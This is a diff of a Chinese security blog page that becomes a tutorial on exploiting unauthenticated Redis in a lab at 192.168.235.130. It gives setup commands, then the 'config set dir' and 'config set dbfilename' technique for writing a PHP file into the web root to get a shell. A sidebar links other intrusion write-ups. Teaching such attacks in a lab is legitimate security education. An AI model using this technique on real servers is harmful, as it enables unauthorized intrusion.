@@ -15,14 +15,30 @@
 <link rel="stylesheet" href="/css/tags.css" media="all">
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="标签云">
-<meta property="og:url" content="https://www.tu3k.cn/tags/index.html">
+<meta name="description" content="漏洞简介Redis安装后，会默认监听6379端口且允许连接的IP为0.0.0.0，如果没有进行一些策略限制，防火墙端口入站规则和限制来源IP访问等，就会把Redis暴露在公网上所有用户都可访问，如果没有密码认证，攻击者可利用脚本来未授权访问Redis，并执行一些命令来进行更危险的操作。 漏洞环境搭建1234wget http:&#x2F;&#x2F;download.redis.io&#x2F;r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问">
+<meta property="og:url" content="https://www.tu3k.cn/2021/01/07/redis/index.html">
 <meta property="og:site_name">
+<meta property="og:description" content="漏洞简介Redis安装后，会默认监听6379端口且允许连接的IP为0.0.0.0，如果没有进行一些策略限制，防火墙端口入站规则和限制来源IP访问等，就会把Redis暴露在公网上所有用户都可访问，如果没有密码认证，攻击者可利用脚本来未授权访问Redis，并执行一些命令来进行更危险的操作。 漏洞环境搭建1234wget http:&#x2F;&#x2F;download.redis.io&#x2F;r">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-02-13T12:24:16.000Z">
-<meta property="article:modified_time" content="2020-12-27T13:43:16.985Z">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/1.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/2.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/3.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/4.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/5.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/6.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/7.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/8.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/9.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/10.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/11.png">
+<meta property="og:image" content="https://www.tu3k.cn/images/redis/12.png">
+<meta property="article:published_time" content="2021-01-07T11:20:04.000Z">
+<meta property="article:modified_time" content="2021-01-07T11:31:04.016Z">
+<meta property="article:tag" content="Redis">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.tu3k.cn/images/redis/1.png">
 
 
     <link rel="icon" href="/images/favicon.ico">
@@ -56,7 +72,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>标签云 | Tu3k's Blog</title>
+<title>Redis未授权访问 | Tu3k's Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -66,7 +82,7 @@
         fancybox: true,
         animate: true,
         isHome: false,
-        isPost: false,
+        isPost: true,
         isArchive: false,
         isTag: false,
         isCategory: false,
@@ -265,11 +281,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="tags-" class="article article-type-tags" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-redis" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/tags/index.html" class="article-date">
-      <time datetime="2020-02-13T12:24:16.000Z" itemprop="datePublished">2020-02-13</time>
+      <a href="/2021/01/07/redis/" class="article-date">
+      <time datetime="2021-01-07T11:20:04.000Z" itemprop="datePublished">2021-01-07</time>
 </a>
 
 
@@ -284,7 +300,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      标签云
+      Redis未授权访问
     </h1>
   
 
@@ -294,6 +310,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Redis/" rel="tag">Redis</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -301,67 +321,77 @@
 <div class="article-entry" itemprop="articleBody">
     
         
-    <hr>
-    <br>
-    
-    <div class="tags">
-        <a href="/tags/Frp%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" style="font-size: 16px; color: #808080">Frp内网转发</a> <a href="/tags/Redis/" style="font-size: 16px; color: #808080">Redis</a> <a href="/tags/Ueditor%E6%BC%8F%E6%B4%9E/" style="font-size: 16px; color: #808080">Ueditor漏洞</a> <a href="/tags/kerberos/" style="font-size: 16px; color: #808080">kerberos</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%BC%AB%E6%B8%B8/" style="font-size: 16px; color: #808080">内网漫游</a> <a href="/tags/%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 16px; color: #808080">教育系统 漏洞挖掘</a> <a href="/tags/%E6%98%9F%E5%A4%967i24%E6%8F%90%E6%9D%83/" style="font-size: 16px; color: #808080">星外7i24提权</a>
-    </div>
-    <style>
-        .category-list li{
-            display: inline-block;
-            margin: 0 1em .5em 0;
-            padding: 4px;
-            border: 1px solid lightgray;
-            font-size: 1.2em;
-        }
-        .category-list a {
-            color: gray;
-        }
-        .category-list-item:hover a {
-            color: gray;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .category-list-count {
-            margin-left: 2px;
-            font-size: .9em;
-        }
-        .article-entry ul li:before{
-            display: none;
-        }
-        .article-inner  {
-            text-align: center;
-        }
-        .tags {
-            max-width: 40em;
-            margin: 2em auto;
-            margin-top: 0em;
-        }
-        .tags a {
-            margin-right: 1em;
-            border-bottom: 1px solid gray;
-            line-height: 65px;
-            white-space: nowrap;
-        }
-        .tags a:hover {
-            border-bottom: 2px solid black;
-            font-style: italic;
-            text-decoration: none;
-        }
-    </style>
+        <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis安装后，会默认监听6379端口且允许连接的IP为0.0.0.0，如果没有进行一些策略限制，防火墙端口入站规则和限制来源IP访问等，就会把Redis暴露在公网上所有用户都可访问，如果没有密码认证，攻击者可利用脚本来未授权访问Redis，并执行一些命令来进行更危险的操作。</p>
+<h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz        &#x2F;&#x2F;wget下载Redis安装包</span><br><span class="line">tar xzvf redis-2.8.17.tar.gz         &#x2F;&#x2F;解压安装包</span><br><span class="line">cd redis-2.8.17         &#x2F;&#x2F;进入redis目录</span><br><span class="line">make               &#x2F;&#x2F;编译</span><br></pre></td></tr></table></figure>
+<p>出现下面这句话就说明编译成功了<br><img src="https://www.tu3k.cn/images/redis/1.png" alt="redis" title="redis未授权访问"><br>PS：建议使用sudo以root身份安装，避免报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd src&#x2F;               &#x2F;&#x2F;进入src目录</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">cp redis-cli &#x2F;usr&#x2F;bin&#x2F;          &#x2F;&#x2F;将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下，类似于加入到环境变量下（这样每次启动redis-server和redis-cli就不用进入安装目录了）</span><br><span class="line">cd ..                                 &#x2F;&#x2F;返回上一级目录</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;           &#x2F;&#x2F;将redis.conf拷贝到&#x2F;etc&#x2F;目录下</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf           &#x2F;&#x2F;使用&#x2F;etc&#x2F;目录下的redis.conf配置来启动redis服务</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.tu3k.cn/images/redis/2.png" alt="redis下载" title="redis"><br>启动成功<br>来到攻击机，执行客户端连接命令<br><code>redis-cli.exe -h 192.168.235.130</code><br><img src="https://www.tu3k.cn/images/redis/3.png" alt="redis下载" title="redis"><br>如果连接不上出现<br><code>Could not connect to Redis at IP:6379：Unknown error</code><br><img src="https://www.tu3k.cn/images/redis/4.png" alt="4" title="4"><br>那就是Redis服务器的配置文件没有设置允许所有IP来访问，来到/etc/redis.conf<br><code>bind 0.0.0.0</code>即可<br><img src="https://www.tu3k.cn/images/redis/5.png" alt="配置redis" title="配置redis"></p>
+<h3 id="Redis-Getshell"><a href="#Redis-Getshell" class="headerlink" title="Redis_Getshell"></a>Redis_Getshell</h3><p>发现Redis未授权访问漏洞后，如果服务器上存在WEB服务，并获取到WEB的路径，可以尝试写一句话进去</p>
+<h4 id="客户端GUI-Getshell"><a href="#客户端GUI-Getshell" class="headerlink" title="客户端GUI Getshell"></a>客户端GUI Getshell</h4><p>首先打开客户端GUI，连接Redis，密码不用填<br><img src="https://www.tu3k.cn/images/redis/6.png" alt="连接redis" title="连接redis"><br>成功登陆<br><img src="https://www.tu3k.cn/images/redis/7.png" alt="redis客户端" title="redis客户端"><br>getshell前提：<br>① Redis服务器上开启了WEB服务，存在网站页面<br>② 知道网站的路径</p>
+<h5 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h5><p>右键—&gt;Console=<br><img src="https://www.tu3k.cn/images/redis/8.png" alt="redis_getshell" title="redis_getshell"><br>在这里执行Redis语句，假设WEB网站路径为/var/www/html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html                        &#x2F;&#x2F;设置网站路径</span><br><span class="line">config set dbfilename tu3k.php                    &#x2F;&#x2F;设置文件名称</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;            &#x2F;&#x2F;set写入内容</span><br><span class="line">save                                                            &#x2F;&#x2F;保存</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.tu3k.cn/images/redis/9.png" alt="redis_getshell" title="redis_getshell"><br>访问即可<br><a target="_blank" rel="noopener" href="http://192.168.235.130/tu3k.php">http://192.168.235.130/tu3k.php</a><br><img src="https://www.tu3k.cn/images/redis/10.png" alt="getshell" title="getshell"></p>
+<h4 id="命令行也一样getshell"><a href="#命令行也一样getshell" class="headerlink" title="命令行也一样getshell"></a>命令行也一样getshell</h4><p><img src="https://www.tu3k.cn/images/redis/11.png" alt="命令行getshell" title="命令行getshell"><br><img src="https://www.tu3k.cn/images/redis/12.png" alt="over" title="getshell"></p>
 
-        
     
 </div>
     
   </div>
   
     
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2021/01/07/redis/">Redis未授权访问</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
+        <p><span>Created:</span>2021-01-07, 19:20:04</p>
+        <p><span>Updated:</span>2021-01-07, 19:31:04</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2021/01/07/redis/" title="Redis未授权访问">https://www.tu3k.cn/2021/01/07/redis/</a>
+            <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/01/07/redis/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
 
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2021/01/04/7i24tiquan/">
+                    记录一次7i24星外虚拟主机提权
+                </a>
+            </div>
+        
+    </nav>
 
   
 </article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-Getshell"><span class="toc-number">1.2.</span> <span class="toc-text">Redis_Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFGUI-Getshell"><span class="toc-number">1.2.1.</span> <span class="toc-text">客户端GUI Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">利用：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B9%9F%E4%B8%80%E6%A0%B7getshell"><span class="toc-number">1.2.2.</span> <span class="toc-text">命令行也一样getshell</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
 
 
 
@@ -379,7 +409,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"标签云　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Redis未授权访问　| 　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -394,6 +424,24 @@
 
     
 
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/01/04/7i24tiquan/" title="Next: 记录一次7i24星外虚拟主机提权">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/redis/">Redis未授权访问</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/04/7i24tiquan/">记录一次7i24星外虚拟主机提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/03/yinduneiwang/">记一次印度网站getshell到内网漫游</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/29/kerberos-study/">个人理解kerberos的作用和运行流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/frp/">Frp内网转发/穿透使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/28/edu_bug/">某教育系统的基础漏洞检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/27/ueditor_net_upload/">Ueditor.NET版本任意文件上传漏洞</a></li></ul>
 
 
 
